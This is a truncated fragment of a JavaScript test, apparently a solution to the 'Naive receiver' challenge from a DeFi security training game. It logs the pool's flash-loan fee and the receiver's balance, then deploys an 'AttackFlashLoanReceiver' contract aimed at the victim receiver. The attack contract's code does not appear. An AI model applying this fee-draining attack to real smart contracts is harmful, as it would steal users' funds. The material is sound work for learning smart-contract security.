...
describe('[Challenge] Naive receiver', function () {
    ...
    it('Execution', async function () {
        ...
        const ETH = await pool.ETH();
        const fee = await pool.flashFee(ETH, 0);
        const balanceBefore = await ethers.provider.getBalance(receiver.address);
        console.log('Token Address:  ', ETH);
        console.log('Loan Fee:       ', fee);
        console.log('Balance Before: ', balanceBefore);

        const attackFactory = await ethers.getContractFactory('AttackFlashLoanReceiver', deployer);
        const attack = await attackFactory.deploy(pool.address, receiver.address, ETH, 10n ** 18n, "0x");
